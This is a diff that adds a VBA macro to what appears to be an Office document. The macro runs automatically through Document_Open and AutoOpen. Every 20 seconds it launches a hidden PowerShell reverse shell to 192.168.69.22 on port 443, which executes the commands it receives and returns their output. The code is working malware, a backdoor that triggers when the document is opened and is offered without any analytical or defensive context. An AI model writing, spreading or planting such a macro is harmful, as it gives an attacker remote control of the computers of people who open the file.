@@ -1,0 +1,29 @@
+Sub Document_Open()
+    AutoBeacon
+End Sub
+
+Sub AutoOpen()
+    AutoBeacon
+End Sub
+
+Sub AutoBeacon()
+    Do
+        Call LetMeIn
+        Wait 20  ' every 20 seconds, we retry
+    Loop
+End Sub
+
+Sub LetMeIn()
+    ' Execute a PowerShell command directly to establish a reverse shell
+    Dim command As String
+    command = "powershell -nop -w hidden -c ""$client = New-Object System.Net.Sockets.TCPClient('192.168.69.22', 443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
+    Shell command, vbHide
+End Sub
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+    Loop Until Now >= DateAdd("s", n, t)
+End Sub
